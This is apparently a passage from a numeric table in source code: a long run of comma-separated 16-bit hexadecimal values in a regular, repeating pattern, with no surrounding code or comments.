0x0007, 0x0007, 0x13FB, 0x13FB, 0x13FC, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FDD, 0x1FDD, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x14FF, 0x14FF, 0x0007, 0x0007, 0x0007, 0x0000, 0x1502, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1500, 0x1FB2, 0x1FB2, 0x1501, 0x150E, 0x150E, 0x0007, 0x0007, 0x0007, 0x0000, 0x1511, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x150F, 0x1501, 0x1501, 0x1510, 0x150F, 0x1510, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1501, 0x1526, 0x1526, 0x0007, 0x0007, 0x0007, 0x0000, 0x1529, 0x0000, 0x0000, 0x1FB2, 0x1FB2, 0x1527, 0x1500, 0x1500, 0x1528, 0x1527, 0x1528, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1500, 0x1500, 0x1501, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x154A, 0x154A, 0x0007, 0x0007, 0x0007, 0x0000, 0x154D, 0x0000, 0x0000, 0x1FDE, 0x1FDE, 0x154B, 0x1FB2, 0x1FB2, 0x154C, 0x1559, 0x1559, 0x0007, 0x0007, 0x0007, 0x0000, 0x155C, 0x0000, 0x0000, 0x1FDE, 0x1FDE, 0x155A, 0x154C, 0x154C, 0x155B, 0x155A, 0x155B, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x154C, 0x1571, 0x1571, 0x0007, 0x0007, 0x0007, 0x0000, 0x1574, 0x0000, 0x0000, 0x1FB2, 0x1FB2, 0x1572, 0x154B, 0x154B, 0x1573, 0x1572, 0x1573, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x154B, 0x154B, 0x154C, 0x0007, 0x0007, 0x0007, 0x1F99, 0x158F, 0x158F, 0x0007, 0x0007, 0x0007, 0x0000, 0x1592, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1590, 0x1F9C, 0x1F9C, 0x1591, 0x159E, 0x159E, 0x0007, 0x0007, 0x0007, 0x0000, 0x15A1, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x159F, 0x1591, 0x1591, 0x15A0, 0x159F, 0x15A0, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1591, 0x15B6, 0x15B6, 0x0007, 0x0007, 0x0007, 0x0000, 0x15B9, 0x0000, 0x0000, 0x1F9C, 0x1F9C, 0x15B7, 0x1590, 0x1590, 0x15B8, 0x15B7, 0x15B8, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1590, 0x1590, 0x1591, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FDF, 0x1FDF, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1694, 0x1694, 0x0007, 0x0007, 0x0007, 0x0000, 0x1697, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1695, 0x1FAD, 0x1FAD, 0x1696, 0x16A3, 0x16A3, 0x0007, 0x0007, 0x0007, 0x0000, 0x16A6, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x16A4, 0x1696, 0x1696, 0x16A5, 0x16A4, 0x16A5, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1696, 0x16BB, 0x16BB, 0x0007, 0x0007, 0x0007, 0x0000, 0x16BE, 0x0000, 0x0000, 0x1FAD, 0x1FAD, 0x16BC, 0x1695, 0x1695, 0x16BD, 0x16BC, 0x16BD, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1695, 0x1695, 0x1696, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x16DF, 0x16DF, 0x0007, 0x0007, 0x0007, 0x0000, 0x16E2, 0x0000, 0x0000, 0x1FE0, 0x1FE0, 0x16E0, 0x1FBB, 0x1FBB, 0x16E1, 0x16EE, 0x16EE, 0x0007, 0x0007, 0x0007, 0x0000, 0x16F1, 0x0000, 0x0000, 0x1FE0, 0x1FE0, 0x16EF, 0x16E1, 0x16E1, 0x16F0, 0x16EF, 0x16F0, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x16E1, 0x1706, 0x1706, 0x0007, 0x0007, 0x0007, 0x0000, 0x1709, 0x0000, 0x0000, 0x1FBB, 0x1FBB, 0x1707, 0x16E0, 0x16E0, 0x1708, 0x1707, 0x1708, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x16E0, 0x16E0, 0x16E1, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1724, 0x1724, 0x0007, 0x0007, 0x0007, 0x0000, 0x1727, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1725, 0x1F9D, 0x1F9D, 0x1726, 0x1733, 0x1733, 0x0007, 0x0007, 0x0007, 0x0000, 0x1736, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1734, 0x1726, 0x1726, 0x1735, 0x1734, 0x1735, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1726, 0x174B, 0x174B, 0x0007, 0x0007, 0x0007, 0x0000, 0x174E, 0x0000, 0x0000, 0x1F9D, 0x1F9D, 0x174C, 0x1725, 0x1725, 0x174D, 0x174C, 0x174D, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1725, 0x1725, 0x1726, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FE1, 0x1FE1, 0x0007, 0x0007, 0x0007, 0x1FE1, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x177B, 0x177B, 0x0007, 0x0007, 0x0007, 0x0000, 0x177E, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x177C, 0x1FBA, 0x1FBA, 0x177D, 0x178A, 0x178A, 0x0007, 0x0007, 0x0007, 0x0000, 0x178D, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x178B, 0x177D, 0x177D, 0x178C, 0x178B, 0x178C, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x177D, 0x17A2, 0x17A2, 0x0007, 0x0007, 0x0007, 0x0000, 0x17A5, 0x0000, 0x0000, 0x1FBA, 0x1FBA, 0x17A3, 0x177C, 0x177C, 0x17A4, 0x17A3, 0x17A4, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x177C, 0x177C, 0x177D, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FE2, 0x1FE2, 0x0007, 0x0007, 0x0007, 0x1FE2, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x17D2, 0x17D2, 0x0007, 0x0007, 0x0007, 0x0000, 0x17D5, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x17D3, 0x1F9E, 0x1F9E, 0x17D4, 0x17E1, 0x17E1, 0x0007, 0x0007, 0x0007, 0x0000, 0x17E4, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x17E2, 0x17D4, 0x17D4, 0x17E3, 0x17E2, 0x17E3, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x17D4, 0x17F9, 0x17F9, 0x0007, 0x0007, 0x0007, 0x0000, 0x17FC, 0x0000, 0x0000, 0x1F9E, 0x1F9E, 0x17FA, 0x17D3, 0x17D3, 0x17FB, 0x17FA, 0x17FB, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x17D3, 0x17D3, 0x17D4, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x181D, 0x181D, 0x0007, 0x0007, 0x0007, 0x0000, 0x1820, 0x0000, 0x0000, 0x1FE3, 0x1FE3, 0x181E, 0x1FB9, 0x1FB9, 0x181F, 0x182C, 0x182C, 0x0007, 0x0007, 0x0007, 0x0000, 0x182F, 0x0000, 0x0000, 0x1FE3, 0x1FE3, 0x182D, 0x181F, 0x181F, 0x182E, 0x182D, 0x182E, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x181F, 0x1844, 0x1844, 0x0007, 0x0007, 0x0007, 0x0000, 0x1847, 0x0000, 0x0000, 0x1FB9, 0x1FB9, 0x1845, 0x181E, 0x181E, 0x1846, 0x1845, 0x1846, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x181E, 0x181E, 0x181F, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1862, 0x1862, 0x0007, 0x0007, 0x0007, 0x0000, 0x1865, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1863, 0x1FA4, 0x1FA4, 0x1864, 0x1871, 0x1871, 0x0007, 0x0007, 0x0007, 0x0000, 0x1874, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1872, 0x1864, 0x1864, 0x1873, 0x1872, 0x1873, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1864, 0x1889, 0x1889, 0x0007, 0x0007, 0x0007, 0x0000, 0x188C, 0x0000, 0x0000, 0x1FA4, 0x1FA4, 0x188A, 0x1863, 0x1863, 0x188B, 0x188A, 0x188B, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1863, 0x1863, 0x1864, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x18AD, 0x18AD, 0x0007, 0x0007, 0x0007, 0x0000, 0x18B0, 0x0000, 0x0000, 0x1FE4, 0x1FE4, 0x18AE, 0x1FBE, 0x1FBE, 0x18AF, 0x18BC, 0x18BC, 0x0007, 0x0007, 0x0007, 0x0000, 0x18BF, 0x0000, 0x0000, 0x1FE4, 0x1FE4, 0x18BD, 0x18AF, 0x18AF, 0x18BE, 0x18BD, 0x18BE, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x18AF, 0x18D4, 0x18D4, 0x0007, 0x0007, 0x0007, 0x0000, 0x18D7, 0x0000, 0x0000, 0x1FBE, 0x1FBE, 0x18D5, 0x18AE, 0x18AE, 0x18D6, 0x18D5, 0x18D6, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x18AE, 0x18AE, 0x18AF, 0x0007, 0x0007, 0x0007, 0x1F99, 0x18F2, 0x18F2, 0x0007, 0x0007, 0x0007, 0x0000, 0x18F5, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x18F3, 0x1F9F, 0x1F9F, 0x18F4, 0x1901, 0x1901, 0x0007, 0x0007, 0x0007, 0x0000, 0x1904, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1902, 0x18F4, 0x18F4, 0x1903, 0x1902, 0x1903, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x18F4, 0x1919, 0x1919, 0x0007, 0x0007, 0x0007, 0x0000, 0x191C, 0x0000, 0x0000, 0x1F9F, 0x1F9F, 0x191A, 0x18F3, 0x18F3, 0x191B, 0x191A, 0x191B, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x18F3, 0x18F3, 0x18F4, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x193D, 0x193D, 0x0007, 0x0007, 0x0007, 0x0000, 0x1940, 0x0000, 0x0000, 0x1FE5, 0x1FE5, 0x193E, 0x1FA3, 0x1FA3, 0x193F, 0x194C, 0x194C, 0x0007, 0x0007, 0x0007, 0x0000, 0x194F, 0x0000, 0x0000, 0x1FE5, 0x1FE5, 0x194D, 0x193F, 0x193F, 0x194E, 0x194D, 0x194E, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x193F, 0x1964, 0x1964, 0x0007, 0x0007, 0x0007, 0x0000, 0x1967, 0x0000, 0x0000, 0x1FA3, 0x1FA3, 0x1965, 0x193E, 0x193E, 0x1966, 0x1965, 0x1966, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x193E, 0x193E, 0x193F, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1982, 0x1982, 0x0007, 0x0007, 0x0007, 0x0000, 0x1985, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1983, 0x1FC6, 0x1FC6, 0x1984, 0x1991, 0x1991, 0x0007, 0x0007, 0x0007, 0x0000, 0x1994, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1992, 0x1984, 0x1984, 0x1993, 0x1992, 0x1993, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1984, 0x19A9, 0x19A9, 0x0007, 0x0007, 0x0007, 0x0000, 0x19AC, 0x0000, 0x0000, 0x1FC6, 0x1FC6, 0x19AA, 0x1983, 0x1983, 0x19AB, 0x19AA, 0x19AB, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1983, 0x1983, 0x1984, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FE6, 0x1FE6, 0x0007, 0x0007, 0x0007, 0x1FE6, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x19D9, 0x19D9, 0x0007, 0x0007, 0x0007, 0x0000, 0x19DC, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x19DA, 0x1FC0, 0x1FC0, 0x19DB, 0x19E8, 0x19E8, 0x0007, 0x0007, 0x0007, 0x0000, 0x19EB, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x19E9, 0x19DB, 0x19DB, 0x19EA, 0x19E9, 0x19EA, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x19DB, 0x1A00, 0x1A00, 0x0007, 0x0007, 0x0007, 0x0000, 0x1A03, 0x0000, 0x0000, 0x1FC0, 0x1FC0, 0x1A01, 0x19DA, 0x19DA, 0x1A02, 0x1A01, 0x1A02, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x19DA, 0x19DA, 0x19DB, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1A24, 0x1A24, 0x0007, 0x0007, 0x0007, 0x0000, 0x1A27, 0x0000, 0x0000, 0x1FE7, 0x1FE7, 0x1A25, 0x1FC2, 0x1FC2, 0x1A26, 0x1A33, 0x1A33, 0x0007, 0x0007, 0x0007, 0x0000, 0x1A36, 0x0000, 0x0000, 0x1FE7, 0x1FE7, 0x1A34, 0x1A26, 0x1A26, 0x1A35, 0x1A34, 0x1A35, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1A26, 0x1A4B, 0x1A4B, 0x0007, 0x0007, 0x0007, 0x0000, 0x1A4E, 0x0000, 0x0000, 0x1FC2, 0x1FC2, 0x1A4C, 0x1A25, 0x1A25, 0x1A4D, 0x1A4C, 0x1A4D, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1A25, 0x1A25, 0x1A26, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1A69, 0x1A69, 0x0007, 0x0007, 0x0007, 0x0000, 0x1A6C, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1A6A, 0x1FB4, 0x1FB4, 0x1A6B, 0x1A78, 0x1A78, 0x0007, 0x0007, 0x0007, 0x0000, 0x1A7B, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1A79, 0x1A6B, 0x1A6B, 0x1A7A, 0x1A79, 0x1A7A, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1A6B, 0x1A90, 0x1A90, 0x0007, 0x0007, 0x0007, 0x0000, 0x1A93, 0x0000, 0x0000, 0x1FB4, 0x1FB4, 0x1A91, 0x1A6A, 0x1A6A, 0x1A92, 0x1A91, 0x1A92, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1A6A, 0x1A6A, 0x1A6B, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FE8, 0x1FE8, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1B6E, 0x1B6E, 0x0007, 0x0007, 0x0007, 0x0000, 0x1B71, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1B6F, 0x1FA8, 0x1FA8, 0x1B70, 0x1B7D, 0x1B7D, 0x0007, 0x0007, 0x0007, 0x0000, 0x1B80, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1B7E, 0x1B70, 0x1B70, 0x1B7F, 0x1B7E, 0x1B7F, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1B70, 0x1B95, 0x1B95, 0x0007, 0x0007, 0x0007, 0x0000, 0x1B98, 0x0000, 0x0000, 0x1FA8, 0x1FA8, 0x1B96, 0x1B6F, 0x1B6F, 0x1B97, 0x1B96, 0x1B97, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1B6F, 0x1B6F, 0x1B70, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FE9, 0x1FE9, 0x0007, 0x0007, 0x0007, 0x1FE9, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1BC5, 0x1BC5, 0x0007, 0x0007, 0x0007, 0x0000, 0x1BC8, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1BC6, 0x1FB7, 0x1FB7, 0x1BC7, 0x1BD4, 0x1BD4, 0x0007, 0x0007, 0x0007, 0x0000, 0x1BD7, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1BD5, 0x1BC7, 0x1BC7, 0x1BD6, 0x1BD5, 0x1BD6, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1BC7, 0x1BEC, 0x1BEC, 0x0007, 0x0007, 0x0007, 0x0000, 0x1BEF, 0x0000, 0x0000, 0x1FB7, 0x1FB7, 0x1BED, 0x1BC6, 0x1BC6, 0x1BEE, 0x1BED, 0x1BEE, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1BC6, 0x1BC6, 0x1BC7, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FEA, 0x1FEA, 0x0007, 0x0007, 0x0007, 0x1FEA, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1C1C, 0x1C1C, 0x0007, 0x0007, 0x0007, 0x0000, 0x1C1F, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1C1D, 0x1FAE, 0x1FAE, 0x1C1E, 0x1C2B, 0x1C2B, 0x0007, 0x0007, 0x0007, 0x0000, 0x1C2E, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1C2C, 0x1C1E, 0x1C1E, 0x1C2D, 0x1C2C, 0x1C2D, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1C1E, 0x1C43, 0x1C43, 0x0007, 0x0007, 0x0007, 0x0000, 0x1C46, 0x0000, 0x0000, 0x1FAE, 0x1FAE, 0x1C44, 0x1C1D, 0x1C1D, 0x1C45, 0x1C44, 0x1C45, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1C1D, 0x1C1D, 0x1C1E, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1C67, 0x1C67, 0x0007, 0x0007, 0x0007, 0x0000, 0x1C6A, 0x0000, 0x0000, 0x1FEB, 0x1FEB, 0x1C68, 0x1FBD, 0x1FBD, 0x1C69, 0x1C76, 0x1C76, 0x0007, 0x0007, 0x0007, 0x0000, 0x1C79, 0x0000, 0x0000, 0x1FEB, 0x1FEB, 0x1C77, 0x1C69, 0x1C69, 0x1C78, 0x1C77, 0x1C78, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1C69, 0x1C8E, 0x1C8E, 0x0007, 0x0007, 0x0007, 0x0000, 0x1C91, 0x0000, 0x0000, 0x1FBD, 0x1FBD, 0x1C8F, 0x1C68, 0x1C68, 0x1C90, 0x1C8F, 0x1C90, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1C68, 0x1C68, 0x1C69, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1CAC, 0x1CAC, 0x0007, 0x0007, 0x0007, 0x0000, 0x1CAF, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1CAD, 0x1FB1, 0x1FB1, 0x1CAE, 0x1CBB, 0x1CBB, 0x0007, 0x0007, 0x0007, 0x0000, 0x1CBE, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1CBC, 0x1CAE, 0x1CAE, 0x1CBD, 0x1CBC, 0x1CBD, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1CAE, 0x1CD3, 0x1CD3, 0x0007, 0x0007, 0x0007, 0x0000, 0x1CD6, 0x0000, 0x0000, 0x1FB1, 0x1FB1, 0x1CD4, 0x1CAD, 0x1CAD, 0x1CD5, 0x1CD4, 0x1CD5, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1CAD, 0x1CAD, 0x1CAE, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FEC, 0x1FEC, 0x0007, 0x0007, 0x0007, 0x1FEC, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1D03, 0x1D03, 0x0007, 0x0007, 0x0007, 0x0000, 0x1D06, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1D04, 0x1FC4, 0x1FC4, 0x1D05, 0x1D12, 0x1D12, 0x0007, 0x0007, 0x0007, 0x0000, 0x1D15, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x1D13, 0x1D05, 0x1D05, 0x1D14, 0x1D13, 0x1D14, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1D05, 0x1D2A, 0x1D2A, 0x0007, 0x0007, 0x0007, 0x0000, 0x1D2D, 0x0000, 0x0000, 0x1FC4, 0x1FC4, 0x1D2B, 0x1D04, 0x1D04, 0x1D2C, 0x1D2B, 0x1D2C, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1D04, 0x1D04, 0x1D05, 0x0007, 0x0007, 0x0007, 